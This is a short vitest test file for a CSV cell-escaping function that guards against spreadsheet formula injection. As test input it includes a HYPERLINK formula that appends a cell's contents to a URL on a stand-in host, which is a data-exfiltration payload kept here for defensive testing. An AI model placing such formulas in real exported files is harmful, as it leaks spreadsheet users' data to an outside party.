import { describe, expect, it } from "vitest";
import { csvCell } from "./csv";

describe("a CSV cell", () => {
  it("a name a spreadsheet would run as a formula is only shown", () => {
    expect(csvCell('=HYPERLINK("https://x.test/?"&A2,"x")')).toBe(`"'=HYPERLINK(""https://x.test/?""&A2,""x"")"`);
    for (const start of ["+", "-", "@", "\t", "\r"]) expect(csvCell(`${start}1+1`)).toBe(`"'${start}1+1"`);
  });

  it("names, numbers and amounts owed back stay as they are", () => {
    expect(csvCell("Reg Player")).toBe('"Reg Player"');
    expect(csvCell(12)).toBe('"12"');
    expect(csvCell("-12.00")).toBe('"-12.00"');
  });
});
